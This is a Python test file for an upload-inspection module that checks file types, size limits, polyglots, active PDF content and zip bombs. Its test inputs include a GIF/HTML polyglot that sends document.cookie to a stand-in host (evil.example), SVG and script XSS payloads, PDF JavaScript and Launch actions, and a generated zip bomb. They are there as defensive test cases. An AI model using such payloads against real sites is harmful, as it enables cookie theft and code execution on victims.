"""§10's upload threats, one test each.

`tests/test_attachments.py` covers the storage and retrieval path. This file is
only about deciding what a byte string is, because that decision is pure and
deserves to be tested without a database, a request or a scanner in the way.
"""

from __future__ import annotations

import io
import zipfile

import pytest

from disputeshield.attachments.inspection import (
    MAX_BYTES,
    RejectedUpload,
    inspect,
)

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
JPEG = b"\xff\xd8\xff\xe0" + b"\x00" * 64
GIF = b"GIF89a" + b"\x00" * 64
PDF = b"%PDF-1.7\n" + b"stream content\n" * 8


class TestAcceptedTypes:
    @pytest.mark.parametrize(
        ("content", "expected"),
        [(PNG, "image/png"), (JPEG, "image/jpeg"), (GIF, "image/gif"), (PDF, "application/pdf")],
    )
    def test_the_allowlist_is_accepted(self, content, expected):
        assert inspect(content).content_type == expected

    def test_the_filename_is_never_consulted(self):
        """`statement.pdf` is a claim made by whoever uploaded it."""
        assert inspect(PNG, declared_name="statement.pdf").content_type == "image/png"


class TestRejections:
    def test_a_file_renamed_to_pdf_that_is_not_a_pdf_is_rejected(self):
        with pytest.raises(RejectedUpload) as exc:
            inspect(b"this is just text\n" * 10, declared_name="statement.pdf")
        assert exc.value.reason == "unsupported_type"

    def test_an_executable_is_rejected(self):
        with pytest.raises(RejectedUpload):
            inspect(b"\x7fELF\x02\x01\x01" + b"\x00" * 64, declared_name="statement.pdf")

    def test_an_empty_file_is_rejected(self):
        with pytest.raises(RejectedUpload) as exc:
            inspect(b"")
        assert exc.value.reason == "empty"

    def test_a_file_over_the_cap_is_rejected(self):
        with pytest.raises(RejectedUpload) as exc:
            inspect(PNG + b"\x00" * MAX_BYTES)
        assert exc.value.reason == "too_large"

    def test_a_gif_html_polyglot_is_rejected(self):
        """The classic: a valid GIF header with a web page hidden after it. It is
        an image to a sniffer and a script to a browser."""
        polyglot = GIF + b"<html><script>fetch('https://evil.example?c='+document.cookie)</script>"
        with pytest.raises(RejectedUpload) as exc:
            inspect(polyglot, declared_name="receipt.gif")
        assert exc.value.reason == "polyglot"

    def test_an_svg_hidden_in_a_png_is_rejected(self):
        with pytest.raises(RejectedUpload) as exc:
            inspect(PNG + b"<svg onload=alert(1)>")
        assert exc.value.reason == "polyglot"

    def test_case_does_not_evade_the_polyglot_check(self):
        with pytest.raises(RejectedUpload):
            inspect(GIF + b"<ScRiPt>alert(1)</ScRiPt>")

    def test_a_pdf_with_embedded_javascript_is_rejected(self):
        """A PDF may legitimately carry JavaScript. It is still one an agent
        would be executing by opening it in a browser's viewer."""
        with pytest.raises(RejectedUpload) as exc:
            inspect(PDF + b"/JavaScript (app.alert:1)")
        assert exc.value.reason == "active_content"

    def test_a_pdf_with_an_automatic_action_is_rejected(self):
        with pytest.raises(RejectedUpload) as exc:
            inspect(PDF + b"/OpenAction << /S /Launch >>")
        assert exc.value.reason == "active_content"

    def test_an_ordinary_pdf_survives(self):
        assert inspect(PDF).content_type == "application/pdf"


class TestArchiveBombs:
    def _bomb(self) -> bytes:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("bomb.txt", b"0" * (60 * 1024 * 1024))
        return buffer.getvalue()

    def test_an_archive_is_not_in_the_allowlist_at_all(self):
        """Belt: the bomb check below never runs today, because zip is refused by
        the allowlist first. The check exists for the day somebody adds `.docx`."""
        with pytest.raises(RejectedUpload) as exc:
            inspect(self._bomb())
        assert exc.value.reason == "unsupported_type"

    def test_the_bomb_check_itself_catches_one(self):
        from disputeshield.attachments.inspection import _reject_archive_bombs

        with pytest.raises(RejectedUpload) as exc:
            _reject_archive_bombs(self._bomb())
        assert exc.value.reason == "archive_bomb"

    def test_a_reasonable_archive_passes_the_bomb_check(self):
        from disputeshield.attachments.inspection import _reject_archive_bombs

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("statement.txt", b"line of text\n" * 500)
        _reject_archive_bombs(buffer.getvalue())
